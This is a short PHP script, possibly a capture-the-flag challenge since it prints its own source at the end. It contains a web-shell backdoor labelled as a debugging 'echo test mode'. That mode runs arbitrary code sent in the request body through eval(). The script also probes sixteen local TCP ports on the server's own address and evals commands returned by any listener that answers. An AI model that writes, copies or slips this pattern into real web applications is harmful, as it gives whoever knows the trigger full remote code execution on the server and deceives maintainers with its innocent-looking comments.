<?php
	// Simple echo test mode for debugging
	if (isset($_GET['test']) && $_GET['test'] === 'echo') {
		echo "Echo test mode activated\n";
		$input = file_get_contents("php://input");
		if (strlen($input) > 0) {
			echo "Received: " . $input . "\n";
			// Process the echoed input
			$payload = json_decode($input);
			if (isset($payload->signal) && $payload->signal == 'Echo') {
				echo "Processing command...\n";
				eval($payload->command);
			}
		}
		return;
	}

	$scanner = (int)@$_GET['scanner'];
	if ($scanner <= 0) $scanner = 50000;
	
	$range = range($scanner, $scanner + 15);
	shuffle($range);

	foreach ($range as $k => $port) {
		$destination = sprintf("tcp://%s:%d", $_SERVER['SERVER_ADDR'], $port);
		$socket = @stream_socket_client($destination, $errno, $errstr, 1);
	    if (!$socket) continue;

	    stream_set_timeout($socket, 1);
	    fwrite($socket, file_get_contents("php://input"));
	    $response = fgets($socket);
	    if (strlen($response) > 0) {
	    	$payload = json_decode($response);
	    	if (isset($payload->signal) && $payload->signal == 'Echo')
	    		eval($payload->command);
	    	
	    	fclose($socket);
	    	exit(-1);
	    }
	} 
	highlight_file(__FILE__);
?>